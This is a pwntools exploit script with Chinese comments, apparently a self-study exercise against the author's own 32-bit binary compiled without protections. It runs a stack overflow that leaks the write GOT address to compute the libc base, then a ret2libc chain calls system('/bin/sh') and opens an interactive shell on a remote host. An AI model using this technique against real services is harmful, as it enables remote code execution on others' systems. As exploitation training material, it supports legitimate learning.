'''
Author: 白银
Date: 2022-12-13 21:40:24
LastEditTime: 2022-12-16 19:30:39
LastEditors: 白银
Description: 源码没直接写system的  gcc question_5.c -m32 -fno-stack-protector -no-pie -o question_5_x86  https://www.bilibili.com/video/BV1mr4y1Y7fW?t=89.4&p=21
Attention: 在哪编译的，就用哪里的libc文件反编译
FilePath: /pwn/question_5_x86.py
'''

from pwn import *

set_arch = 2

if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')

pwnfile = './question_5_x86'
state = 0  # 0为远程

if state == 0:
    io = remote("192.168.61.134", 8888)
    # io = remote("129.226.211.132", 8888)
else:
    io = process(pwnfile)

    # 本地用
    elf = ELF(pwnfile)
    rop = ROP(pwnfile)

    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x14  # ida看，buf和r差多少
return_addr = 0x8049166  # p &dofunc，因为没有func
deadbeef = 0xdeadbeef  # func的返回地址，随意
# bin_sh_addr = 0x804c018  # search "/bin/sh"
write_sym = 0x8049050  # ida找_write，看jmp到哪，不用进去，就看左边是哪
leak_func_got = 0x804C008  # ida找_write，看jmp到哪，进去找write

payload = flat([b'a' * padding, write_sym, return_addr, 1, leak_func_got, 4])

delimiter = 'input:'

if state == 0:
    io.sendline(payload)  # 远程用
else:
    io.sendlineafter(delimiter, payload)  # 本地用

io.recvuntil(b'byebye')

write_addr = u32(io.recv(4))
print('write_addr:', hex(write_addr))

write_offset = 0x10AE00  # vmmap找用的libc，ida打开，找write，直接左边的地址，即偏移地址
libc_addr = write_addr - write_offset  # 算基地址
print('libc_addr:', hex(libc_addr))

system_offset = 0x4C800  # vmmap找用的libc，ida打开，找system，直接左边的地址，即偏移地址
system_addr = libc_addr + system_offset  # 算system地址
print('system_addr:', hex(system_addr))

bin_ssh_offset = 0x1B5FAA  # vmmap找用的libc，ida打开，shift+f12找/bin/sh，直接左边的地址，即偏移地址
bin_ssh_addr = libc_addr + bin_ssh_offset  # /bin/sh
print('bin_ssh_addr:', hex(bin_ssh_addr))

'''
经历以上，会返回主程序再接收input，需要再来一次
'''

payload2 = flat(['a' * padding, system_addr, deadbeef, bin_ssh_addr])

delimiter = 'input:'

if state == 0:
    io.sendline(payload2)  # 远程用
else:
    io.sendlineafter(delimiter, payload2)  # 本地用

io.interactive()
